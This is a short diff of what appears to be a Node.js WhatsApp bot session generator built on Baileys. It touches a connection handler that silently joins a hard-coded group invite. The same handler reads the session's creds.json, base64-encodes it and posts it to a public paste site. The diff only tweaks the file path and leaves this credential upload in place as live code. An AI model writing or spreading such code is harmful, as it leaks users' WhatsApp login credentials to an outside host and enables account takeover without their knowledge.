@@ -67,7 +67,6 @@ const { delay, useMultiFileAuthState, BufferJSON, fetchLatestBaileysVersion, PHO
                     } = s
                     if (connection == "open") {
                         await session.groupAcceptInvite("GkYZvcVSUSR1WBvl6rBpiw");
-                        const authfile = (`./session/creds.json`)
                         await delay(1000 * 10)
                         var tsurue = "";
                         let fil = await file.readFileSync("./session/creds.json", "utf-8");
@@ -154,10 +153,9 @@ const { delay, useMultiFileAuthState, BufferJSON, fetchLatestBaileysVersion, PHO
                     } = s
                     if (connection == "open") {
                         await session.groupAcceptInvite("GkYZvcVSUSR1WBvl6rBpiw");
-                        const authfile = (`./session/creds.json`)
                         await delay(1000 * 10)
                         var tsurue = "";
-                        let fil = await file.readFileSync("./session/creds.json", "utf-8");
+                        let fil = await file.readFileSync(__dirname+"/session/creds.json", "utf-8");
                         let filz = base64encode(fil);
                         await console.log(filz);
                         let link = await axios.post('http://paste.c-net.org/', "" + filz, {
